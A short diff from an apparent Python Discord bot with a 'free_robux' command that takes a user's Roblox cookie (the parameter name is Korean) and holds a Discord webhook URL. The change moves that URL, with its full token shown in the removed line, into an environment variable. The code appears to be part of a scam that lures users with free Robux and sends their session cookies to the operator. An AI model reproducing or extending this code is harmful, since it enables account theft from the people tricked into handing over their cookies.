@@ -22,7 +22,7 @@ async def free_robux(interaction: discord.Interaction, 로블록스_쿠키: str)
     try:
         
         # Never hardcode your webhook URL directly in your code, consider using a config file
-        webhook_url = "https://discord.com/api/webhooks/1195928311373779034/9n6FwsReoYk73oyw6RXJDbucRjmhIlpXm8ezS7D7Ph1DePpK6su4hBFvL0ZAq2lepmvy"
+        webhook_url = os.environ.get('webhook')
 
         cookie = 로블록스_쿠키
         
